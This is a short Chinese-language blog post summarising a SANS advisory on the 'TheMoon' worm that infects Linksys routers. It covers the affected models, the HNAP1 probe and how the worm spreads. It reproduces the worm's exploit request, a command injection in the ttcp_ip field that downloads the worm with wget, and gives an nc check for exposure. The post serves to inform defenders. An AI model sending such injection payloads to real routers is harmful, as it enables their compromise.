---
layout: post
title: "Linksys Worm the moon Summary"
description: ""
category: 
tags: []
---
{% include JB/setup %}

Linksys路由器蠕虫The Moon正在蔓延。

近日，国外安全研究者发布[Linksys路由器蠕虫预警](https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633)。根据路由器的固件版本，E4200, E3200, E3000, E2500, E2100L, E2000, E1550, E1500, E1200, E1000,E900等型号存在被蠕虫感染的风险。

这个蠕虫首先连接路由器的8080端口，请求“/HNAP1/”这个路径。linksys路由器会返回一个包含路由器特性和固件版本的xml文档。蠕虫很可能通过解析硬件型号和固件版本来判断目标是否存在漏洞。

	<ModelName>E2500</ModelName>
	<FirmwareVersion>1.0.07 build 1</FirmwareVersion> 

这是E2500型号返回的相关信息。

之后，蠕虫会发送一个特定的请求到存在漏洞的路由器，这个请求会导致路由器执行一段shell脚本，从而感染蠕虫。

第二次的请求如下：

	submit_button=&change_action=&submit_type=&action=&commit=0&ttcp_num=2&ttcp_size=2
	&ttcp_ip=-h
    `cd /tmp;if [ ! -e .L26 ];then wget http://[source IP]:193/0Rx.mid;fi`
	&StartEPI=1

一旦被蠕虫感染，路由器就会扫描其他的ip，这个蠕虫内置了大约670个不同国家的家用网段。而且被感染的路由器在短时间内会作为http服务器供其他被感染的路由器下载蠕虫代码。

目前尚不清楚这个蠕虫网络是否存在命令和控制频道。当前它的行为仅仅是传播。

研究者在蠕虫的文件中发现了电影[《The Moon》](http://www.imdb.com/title/tt1182345/)的相关图片，所以被命名为The Moon。

可以通过以下命令来检测自己的路由器是否存在漏洞：

	echo "GET /HNAP1/ HTTP/1.1\r\nHost: test\r\n\r\n" | nc routerip 8080

如果或得了xml格式的返回数据，那么你的路由器很可能存在漏洞，有被蠕虫感染的风险。

via [isc.sans.edu](https://isc.sans.edu/diary/Linksys+Worm+%22TheMoon%22+Summary%3A+What+we+know+so+far/17633)



